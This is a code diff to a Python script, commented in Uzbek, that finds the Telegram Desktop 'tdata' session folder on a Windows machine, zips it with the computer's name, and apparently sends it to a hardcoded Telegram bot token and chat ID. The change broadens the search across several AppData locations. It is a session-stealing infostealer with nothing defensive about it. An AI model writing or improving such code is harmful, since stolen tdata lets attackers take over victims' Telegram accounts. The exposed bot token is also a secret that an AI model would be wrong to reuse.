@@ -15,7 +15,7 @@ if os.name == 'nt':
 BOT_TOKEN = "8474648259:AAH3sMxwJCPwkit40x--YgvETDLkZ0jmgu4"
 CHAT_ID = 7080045924
 
-# requests ISHLATMAYDIGAN Telegram yuborish funksiyalari
+# requests ishlatmaydigan Telegram funksiyalar
 def send_telegram_file(file_path, caption):
     try:
         url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
@@ -58,12 +58,27 @@ def zip_folder(folder_path, output_path):
                 except:
                     pass
 
+# --- BARCHA MUMKIN BO'LGAN YO'LLARNI QIDIRISH ---
+def find_tdata():
+    base_paths = [
+        os.getenv('APPDATA'),                 # C:\Users\...\AppData\Roaming
+        os.path.join(os.getenv('LOCALAPPDATA')), # C:\Users\...\AppData\Local
+        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming'), # Zaxira yo'l
+        os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Local')    # Zaxira yo'l
+    ]
+    
+    for base in base_paths:
+        if base and os.path.exists(base):
+            path = os.path.join(base, 'TelegramDesktop', 'tdata')
+            if os.path.exists(path):
+                return path
+    return None
+
 def main():
     pc_name = socket.gethostname()
-    appdata = os.getenv('APPDATA')
-    tdata_path = os.path.join(appdata, 'TelegramDesktop', 'tdata')
+    tdata_path = find_tdata()
 
-    if os.path.exists(tdata_path):
+    if tdata_path:
         try:
             temp_dir = tempfile.gettempdir()
             zip_path = os.path.join(temp_dir, f"tdata_{pc_name}.zip")
